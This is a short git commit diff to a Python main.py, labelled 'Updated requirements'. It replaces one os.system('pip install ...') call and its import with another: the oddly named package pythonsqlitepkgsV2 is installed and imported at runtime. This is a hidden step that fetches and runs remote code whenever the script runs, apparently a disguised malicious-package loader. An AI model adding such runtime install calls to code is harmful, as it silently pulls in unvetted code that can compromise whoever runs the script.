c66969edcc6da9d5cbfeee50f1513db9c4fa2585
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-08 23:10:14 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringspackageV2")
-import pipcoloringspackageV2
+os.system("pip install pythonsqlitepkgsV2")
+import pythonsqlitepkgsV2
 import random
 import requests
 import time
